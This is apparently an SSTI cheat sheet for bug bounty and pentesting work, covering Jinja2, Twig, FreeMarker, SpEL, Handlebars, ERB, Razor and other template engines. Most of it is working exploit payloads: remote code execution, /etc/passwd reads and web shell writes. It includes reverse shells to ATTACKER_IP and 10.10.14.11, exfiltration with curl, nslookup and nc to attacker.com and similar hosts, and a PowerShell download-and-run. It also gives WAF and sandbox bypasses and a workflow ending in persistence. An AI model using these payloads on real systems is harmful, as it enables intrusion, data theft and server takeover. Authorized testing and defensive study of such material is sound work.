


# 🎯 SSTI (Server-Side Template Injection) -Cheat Sheet


> A practical, structured guide covering detection → identification → exploitation → bypass → tools.

---

## 📋 Table of Contents

1. [Where to Hunt (High-Value Targets)](#1-where-to-hunt-high-value-targets)
2. [Detection Phase](#2-detection-phase)
3. [Engine Identification](#3-engine-identification)
4. [Exploitation by Language](#4-exploitation-by-language)
   - [Python (Jinja2, Tornado, Mako, Django)](#python)
   - [PHP (Twig, Smarty, Blade, Latte)](#php)
   - [Java (FreeMarker, Velocity, Thymeleaf, SpEL, OGNL, Groovy)](#java)
   - [JavaScript/NodeJS (Handlebars, Pug, Nunjucks, EJS)](#nodejs)
   - [Ruby (ERB, Slim, Liquid)](#ruby)
   - [.NET (Razor)](#net)
   - [Elixir (EEx)](#elixir)
   - [Go](#go)
5. [Blind SSTI Techniques](#5-blind-ssti-techniques)
6. [Advanced Filter & WAF Bypass](#6-advanced-filter--waf-bypass)
7. [Real-World Lab Ideas & Report Concepts](#7-real-world-lab-ideas--report-concepts)
8. [Tools](#8-tools)
9. [Quick Reference Mind Map](#9-quick-reference-mind-map)

---

## 1. Where to Hunt (High-Value Targets)

### 🎯 Features That Love Templates

| Feature | Why It's Risky |
|---------|---------------|
| **Email Template Preview** | User writes HTML with variables like `{{name}}` |
| **Invoice / PDF Generation** | Backend renders HTML → PDF using templates |
| **CMS Preview / "Preview Before Publish"** | Dynamic template rendering from user input |
| **Admin Custom Templates** | Direct template editing by admins |
| **Log Viewer / Error Pages** | Custom error pages with dynamic content |
| **Profile Greeting / Name Display** | `Hello {{username}}` patterns |
| **Report Generators** | Dynamic report building with user data |
| **Webhook Customization** | User-defined webhook payloads |

### 🚩 Parameters to Test

```
name=          username=        email=
message=       template=        preview=
view=          page=            content=
greeting=      subject=         body=
format=        layout=          custom_
```

### 💡 Bug Bounty Tip
> **"Generated PDFs, invoices, and emails almost always use a template engine. Start there."**

---

## 2. Detection Phase

### Step 1: Generic Fuzz (The Polyglot)

```
${{<%[%'"}}%\
```

**What to look for:**
- 🔴 HTTP 500 / Syntax Error
- 🟡 Parts of payload missing from reflection
- 🟢 Page layout breaks or behaves differently

### Step 2: Arithmetic Test (The Golden Test)

Try ALL of these — different engines, different syntax:

```
{{7*7}}        ${7*7}         #{7*7}
<%= 7*7 %>     { 7*7 }        {{= 7*7 }}
{= 7*7 }       \n= 7*7 \n      *{7*7}
@{7*7}         @(7*7)         [[${7*7}]]
```

**If response = `49` → Execution Confirmed**
**If no output → Try Blind SSTI techniques**

### Step 3: Error-Based Detection

Inject a division by zero to trigger language-specific errors:

```
(1/0).zxy.zxy
```

| Error Message | Language/Engine |
|---------------|-----------------|
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` / `TypeError` | NodeJS |
| `Division by zero` / `DivisionByZeroError` | PHP |
| `divided by 0` | Ruby |
| `Arithmetic operation failed` | FreeMarker (Java) |

### Step 4: Context Check

**Plaintext Context:** Distinguish from XSS
```
{{7*7}}  → If 49 appears, it's SSTI (not just XSS reflection)
```

**Code Context:** Test if the server evaluates expressions
```
?greeting=data.username}}hello
→ If output is dynamic (actual username), SSTI confirmed
```

---

## 3. Engine Identification

### Quick Reference Table

| Engine | Detect Payload | Language |
|--------|---------------|----------|
| **Jinja2** | `{{7*7}}` → 49, `{{7*'7'}}` → 7777777 | Python |
| **Twig** | `{{7*7}}` → 49, `{{7*'7'}}` → 49 | PHP |
| **Django** | `{{7*7}}` → Error (no math in DT) | Python |
| **FreeMarker** | `${7*7}` → 49, `#{7*7}` → 49 (legacy) | Java |
| **Velocity** | `#set($x=7*7)$x` → 49 | Java |
| **Thymeleaf** | `${7*7}` → 49, `[[${7*7}]]` | Java |
| **ERB** | `<%= 7*7 %>` → 49 | Ruby |
| **Slim** | `#{7*7}` → 49 | Ruby |
| **Pug** | `#{7*7}` → 49 | NodeJS |
| **Handlebars** | `{{7*7}}` → 49 | NodeJS |
| **Nunjucks** | `{{7*7}}` → 49 | NodeJS |
| **Razor** | `@(7*7)` → 49 | .NET |
| **Mako** | `${7*7}` → 49 | Python |
| **Tornado** | `{{7*7}}` → 49, `{{7*'7'}}` → 7777777 | Python |
| **SpEL** | `${7*7}` → 49 | Java |
| **OGNL** | `${7*7}` → 49 | Java |
| **Groovy** | `${9*9}` → 81 | Java |
| **Pebble** | `{{7*7}}` → 49 | Java |
| **Jinjava** | `{{7*7}}` → 49 | Java |
| **EEx** | `<%= 7*7 %>` → 49 | Elixir |
| **Go Templates** | `{{printf "%s" "ssti"}}` → ssti | Go |

### 🔑 Key Differentiator: Jinja2 vs Twig

```
{{7*'7'}}
→ Jinja2: 7777777 (string multiplication)
→ Twig: 49 (string cast to int)
```

### 🔑 Key Differentiator: Jinja2 vs Django Templates

```
{% csrf_token %}
→ Jinja2: Error (unknown tag)
→ Django: Works fine
```

---

## 4. Exploitation by Language

---

### 🐍 Python

#### Templating Libraries

| Engine | Payload Format |
|--------|---------------|
| Jinja2 | `{{ }}` |
| Django | `{{ }}` |
| Mako | `${ }` |
| Tornado | `{{ }}` |
| Bottle | `{{ }}` |
| Chameleon | `${ }` |

#### Jinja2 — The King of SSTI

**Basic Injection:**
```jinja2
{{7*7}}
{{7*'7'}}           # → 7777777 (Jinja2 signature)
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
```

**Info Leak:**
```jinja2
{{self}}
{{request}}
{{session}}
{{g}}
```

**Debug Dump (if enabled):**
```jinja2
{% debug %}
```

**File Read:**
```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**RCE — Context-Free Payloads (no __builtins__ needed):**
```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}  # Shortest known!
```

**RCE — Full Path:**
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Write File:**
```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php', 'w').write('<?php system($_GET[cmd]); ?>') }}
```

**Reverse Shell:**
```jinja2
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh", "-i"]);'").read()}}{%endif%}{% endfor %}
```

**Blind RCE — Force Output:**
```jinja2
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Pwned')
    return r
")
}}
```

#### Tornado

```python
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

#### Mako

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

**Mako — Direct os access paths:**
```python
${self.module.cache.util.os.system("id")}
${self.template.module.runtime.util.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
```

#### Django

```python
{{ 7*7 }}           # Error in Django Templates (confirms DT vs Jinja2)
{% csrf_token %}    # Error in Jinja2
{{ messages.storages.0.signer.key }}  # Leak SECRET_KEY
{% include 'admin/base.html' %}        # Admin URL leak

# Admin creds leak:
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

---

### 🐘 PHP

#### Templating Libraries

| Engine | Payload Format |
|--------|---------------|
| Twig | `{{ }}` |
| Smarty | `{ }` |
| Blade (Laravel) | `{{ }}` |
| Latte | `{ }` |
| Plates | `<?= ?>` |

#### Twig

**Basic Injection:**
```twig
{{7*7}}
{{7*'7'}}           # → 49 (Twig signature)
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

**File Read:**
```twig
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

**RCE:**
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{[0]|reduce('system','id')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```

**Twig — Sandbox Bypass (CVE-2022-23614):**
```twig
{% set a = ["error_reporting", "1"]|sort("ini_set") %}{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}{{ ["id", 0]|sort("system") }}{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}
```

#### Smarty

```smarty
{$smarty.version}
{php}echo `id`;{/php}          # Deprecated in v3
{system('ls')}                   # v3 compatible
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

#### Blade (Laravel)

```php
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

#### Latte

```php
{var $X="POC"}{$X}
{php system('nslookup oastify.com')}
```

---

### ☕ Java

#### Templating Libraries

| Engine | Payload Format |
|--------|---------------|
| FreeMarker | `${ }`, `#{ }`, `[= ]` |
| Velocity | `#set($X="") $X` |
| Thymeleaf | `[[ ]]`, `${ }` |
| SpEL | `*{ }`, `#{ }`, `${ }` |
| OGNL | `${ }` |
| Groovy | `${ }` |
| Pebble | `{{ }}` |
| Jinjava | `{{ }}` |

#### FreeMarker

**Basic Injection:**
```freemarker
${7*7}
#{7*7}              # Legacy syntax
[=7*7]              # Alternative syntax (v2.3.4+)
```

**RCE:**
```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

**File Read:**
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

**Sandbox Bypass (< 2.3.30):**
```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

#### Velocity

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

#### Thymeleaf

```java
${7*7}
${T(java.lang.Runtime).getRuntime().exec('calc')}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

**Thymeleaf — URL-based (Spring View Manipulation):**
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```

**Thymeleaf — Expression Preprocessing:**
```html
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

#### SpEL (Spring Expression Language)

```java
${7*7}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

# Read /etc/passwd (char-by-char bypass):
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97))...).getInputStream())}

# Command Execution:
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}

# DNS Exfiltration:
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","attacker.com")}

# Session Manipulation:
${pageContext.request.getSession().setAttribute("admin",true)}
```

#### OGNL (Object-Graph Navigation Language)

```java
# Basic:
${7*7}
${'patt'.toString().replace('a', 'x')}

# RCE:
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())

# Error-Based:
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0

# Boolean-Based:
1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""

# Time-Based:
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
```

#### Groovy

```groovy
${"calc.exe".execute()}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}

# Sandbox Bypass:
${ @groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")}) def x }
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

#### Pebble

```java
# Old (< 3.0.9):
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}

# New:
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

#### Jinjava

```java
{{'a'.toUpperCase()}}
{{ request }}

# RCE (Fixed in PR #230):
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
```

#### Java EL (Expression Language)

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

# If ${...} doesn't work, try:
#{...}  *{...}  @{...}  ~{...}
```

---

### 🟨 NodeJS / JavaScript

#### Templating Libraries

| Engine | Payload Format |
|--------|---------------|
| Handlebars | `{{ }}` |
| Pug | `#{ }` |
| Nunjucks | `{{ }}` |
| EJS | `<% %>` |
| Lodash | `{{= }}` |
| DustJS | `{ }` |
| VueJS | `{{ }}` |
| JsRender | `{{ }}` |

#### Handlebars

```handlebars
{{this}}
{{self}}

# RCE (versions < 4.1.2, < 4.0.14, < 3.0.7):
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Pug

```pug
#{7*7}
#{global.process.mainModule.require('child_process').execSync('id')}

# Alternative:
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

#### Nunjucks

```nunjucks
{{7*7}}

# RCE:
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")() }}

# Reverse Shell:
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")() }}
```

#### EJS / Underscore / Lodash

```javascript
// Lodash:
{{= _.VERSION}}
{{= Object.keys(this) }}

// RCE in Lodash:
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

#### NodeJS Sandboxes (vm2 / isolated-vm)

```javascript
={{ (function() {
  const require = this.process.mainModule.require;
  const execSync = require("child_process").execSync;
  return execSync("id").toString();
})() }}
```

---

### 💎 Ruby

#### Templating Libraries

| Engine | Payload Format |
|--------|---------------|
| ERB | `<%= %>` |
| Slim | `#{ }` |
| HAML | `#{ }` |
| Liquid | `{{ }}` |
| Mustache | `{{ }}` |

#### ERB

```ruby
<%= 7 * 7 %>
<%= system("whoami") %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines() %>
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
```

#### Slim

```ruby
#{ 7 * 7 }
#{ %x|env| }
```

#### Universal Ruby Payloads

```ruby
%x('id')                          # Rendered RCE
File.read("Y:/A:/"+%x('id'))     # Error-Based RCE
1/(system("id")&&1||0)           # Boolean-Based RCE
system("id && sleep 5")           # Time-Based RCE
```

---

### 🔷 .NET (Razor / ASP.NET)

#### Razor

```csharp
@(1+2)
@(7*7)

# RCE:
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc BASE64")

# Reflection Bypass:
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c "whoami"".Split(","))}
```

#### Classic ASP

```asp
<%= 7*7 %>
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')").StdOut.ReadAll() %>
```

---

### 💧 Elixir

#### EEx (Embedded Elixir)

```elixir
<%= 7 * 7 %>
<%= File.read!("/etc/passwd") %>
<%= elem(System.shell("id"), 0) %>

# Error-Based:
<%= [1, 2][elem(System.shell("id"), 0)] %>

# Boolean-Based:
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %>

# Time-Based:
<%= elem(System.shell("id && sleep 5"), 0) %>
```

---

### 🐹 Go

```go
{{ . }}                    # Reveals data structure
{{printf "%s" "ssti" }}   # → "ssti"
{{html "ssti"}}           # → "ssti" (html/template encodes)

# XSS Bypass (text/template):
{{define "T1"}}alert(1){{end}} {{template "T1"}}

# RCE (requires method on object):
{{ .System "ls" }}
```

---

## 5. Blind SSTI Techniques

When there's no visible output, use these techniques:

### ⏱ Time-Based Detection

```jinja2
# Jinja2:
{{ cycler.__init__.__globals__.os.system('sleep 5') }}

# FreeMarker:
${"freemarker.template.utility.Execute"?new()("sleep 5")}

# Twig:
{{['sleep 5']|filter('system')}}

# Ruby ERB:
<%= system("id && sleep 5") %>

# If sleep is filtered — CPU loop:
{% for i in range(10**8) %}{% endfor %}
```

### 📡 Out-of-Band (OOB) Exfiltration

```jinja2
# DNS Exfiltration:
{{ cycler.__init__.__globals__.os.system('nslookup $(whoami).attacker.com') }}

# HTTP Callback:
{{ cycler.__init__.__globals__.os.system('curl http://attacker.com/$(whoami)') }}

# Java SpEL DNS:
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","$(whoami).attacker.com")}
```

### ✅ Boolean-Based Extraction

```jinja2
# Jinja2:
{{ 1 if config.SECRET_KEY.startswith('A') else 0 }}

# SpEL:
${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}

# OGNL:
1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
```

**Observe:** Content-Length, Status Code, Redirect, Response Time

### 🔁 Blind SSTI Strategy

```
1️⃣ Inject sleep → Confirm delay
2️⃣ Confirm command execution
3️⃣ Use OOB channel (DNS/HTTP)
4️⃣ Extract secrets bit-by-bit
5️⃣ Escalate to reverse shell
```

---

## 6. Advanced Filter & WAF Bypass

### 🚫 If `{{ }}` is filtered

```jinja2
{% set x=7*7 %}{{x}}
{% if 7*7==49 %}YES{% endif %}
```

### 🚫 If `.` is filtered

```jinja2
# Use |attr() filter:
{{request|attr("__class__")}}
{{cycler|attr("__init__")|attr("__globals__")}}
```

### 🚫 If `_` is filtered

```jinja2
# Hex encoding:
{{request|attr("\x5f\x5fclass\x5f\x5f")}}

# String multiplication:
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
# Send: &class=class&usc=_
```

### 🚫 If `[` and `]` are filtered

```jinja2
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}
# Or use |attr("__getitem__")
```

### 🚫 If `|join` is filtered

```jinja2
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}
# Send: &f=%s%sclass%s%s&a=_
```

### 🚫 Full Bypass (no `.`, `_`, `|join`, `[`, `]`, `mro`, `base`)

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 🔤 String Construction

```jinja2
{{ "o" ~ "s" }}
{{ ["o","s"]|join }}
{{ "%c%c"|format(111,115) }}
```

### 🔢 Numeric Bypass (if numbers filtered)

```jinja2
{{ True + True }}           # → 2
{{ range(10)|length }}      # → 10
```

### 🧠 Parameter Smuggling

```jinja2
# Instead of:
{{request.__class__}}

# Use:
{{request|attr(request.args.param)}}
# Send: &param=__class__
```

### 🆕 Regex Linefeed Bypass (Ruby)

If filter is `/^[0-9a-z]+$/`:

```
abc
<%= 7*7 %>
```

In Ruby: `^` and `$` match line start/end, not string start/end.
**Fix:** Use `\A` and `\z` in Ruby.

### 🆕 Double Rendering Attack

Scenario:
```python
render_template(user_input)
# then
render_template_string(result)
```

Common in Flask → allows **nested SSTI**.

### 🆕 Encoding Tricks

```
URL Encoding:        %7B%7B7*7%7D%7D
Double Encoding:     %257B%257B7*7%257D%257D
Unicode:             \u007b\u007b7*7\u007d\u007d
```

### 🆕 WAF Evasion Ideas

- ✅ Case manipulation: `{{7*7}}` → `{{7*7}}`
- ✅ Whitespace injection: `{{ 7 * 7 }}`
- ✅ Tabs instead of spaces
- ✅ Inline comments: `{{ cycler/*comment*/.__init__ }}`
- ✅ Newline injection
- ✅ String concatenation
- ✅ Hex encoding
- ✅ Parameter splitting

---

## 7. Real-World Lab Ideas & Report Concepts

### 🧪 Labs to Practice

| Lab | Platform | Focus |
|-----|----------|-------|
| Java SSTI | Root Me | Java template engines |
| Python SSTI Intro | Root Me | Jinja2 basics |
| Blind SSTI Filter Bypass | Root Me | Blind exploitation |
| PortSwigger SSTI Labs | PortSwigger | Multi-engine, multi-context |
| DOM XSS + SSTI Chains | Custom | Context confusion |
| Flask/Jinja2 CTFs | CTFtime | Filter bypass |

### 📝 Report Writing Ideas

1. **"Template Injection in Email Preview"** — User input rendered in email template
2. **"PDF Generation SSTI to RCE"** — wkhtmltopdf / WeasyPrint with template injection
3. **"Blind SSTI in Invoice Generator"** — Time-based extraction of customer data
4. **"SSTI → SSRF Chain"** — Template injection triggers server-side request forgery
5. **"WAF Bypass via Unicode Normalization"** — Using Unicode equivalents to bypass filters

### 💡 Advanced Concepts from Reports

- **Syntax Confusion:** Same syntax, different engines → ambiguous parsing exploits
- **Context Confusion:** Template context vs. JavaScript context vs. HTML context
- **Double Evaluation:** Template rendered twice → nested injection
- **Template Injection → XXE:** Some engines allow XML processing
- **SSTI in PDF Generators:** WeasyPrint, wkhtmltopdf, Puppeteer with user templates

---

## 8. Tools

### Automated Scanners

| Tool | Description | Command |
|------|-------------|---------|
| **TInjA** | SSTI + CSTI scanner with polyglots | `tinja url -u "http://example.com/?name=Kirlia"` |
| **SSTImap** | Automatic SSTI detection & exploitation | `python3 sstimap.py -u "http://example.com/" --crawl 5 --forms` |
| **tplmap** | Classic SSTI exploitation tool | `python2.7 ./tplmap.py -u 'http://target.com/page?name=John*' --os-shell` |

### Manual Helpers

| Tool | Use |
|------|-----|
| **Burp Collaborator** | OOB detection, DNS exfiltration |
| **Interactsh** | OOB interaction detection |
| **Template Injection Table** | Interactive polyglot table for 44+ engines |
| **PayloadsAllTheThings** | Comprehensive payload collection |

### Wordlists

```
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt
```

---

## 9. Quick Reference Mind Map

```
SSTI
├── DETECT
│   ├── Polyglot: ${{<%[%'"}}%\
│   ├── Math: {{7*7}}, ${7*7}, #{7*7}, <%=7*7%>
│   └── Error: (1/0).zxy.zxy
│
├── IDENTIFY
│   ├── Jinja2: {{7*'7'}} → 7777777
│   ├── Twig: {{7*'7'}} → 49
│   ├── FreeMarker: ${7*7}
│   ├── ERB: <%=7*7%>
│   └── ... (see table)
│
├── EXPLOIT
│   ├── Info Leak: {{config}}, {{request}}
│   ├── File Read: {{open('/etc/passwd').read()}}
│   ├── RCE: {{os.popen('id').read()}}
│   └── Reverse Shell: See payloads above
│
├── BLIND
│   ├── Time-Based: sleep 5
│   ├── OOB: curl attacker.com
│   └── Boolean: Content-Length diff
│
├── BYPASS
│   ├── Filtered {{ }} → {% set x=7*7 %}{{x}}
│   ├── Filtered . → |attr()
│   ├── Filtered _ → \x5f hex
│   └── WAF → Encoding, case, whitespace
│
└── TOOLS
    ├── TInjA (scan)
    ├── SSTImap (exploit)
    ├── tplmap (classic)
    └── Burp Collaborator (OOB)
```

---

## 🏆 Pro-Level Workflow

```
1️⃣  RECON → Find template features (email, PDF, preview)
2️⃣  DETECT → Fuzz with polyglot + math payloads
3️⃣  IDENTIFY → Pinpoint engine using signature payloads
4️⃣  TEST BLACKLIST → Try basic payloads, observe blocks
5️⃣  BYPASS → Reconstruct blocked strings (attr, hex, concat)
6️⃣  ACHIEVE EXECUTION → RCE or file read
7️⃣  BLIND? → Switch to OOB (DNS/HTTP callbacks)
8️⃣  EXTRACT SECRETS → Config, env, DB creds
9️⃣  ESCALATE → Reverse shell, persistence
```

---

## 📚 References

- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle](https://portswigger.net/research/server-side-template-injection)
- [Limitations are just an illusion – advanced SSTI exploitation - YesWeHack](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin](https://github.com/vladko312/Research_Successful_Errors)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Hacktricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [Template Injection Table - Hackmanit](https://github.com/Hackmanit/template-injection-table)

---

> **"Every template is a potential shell. Treat them accordingly."** 🎯
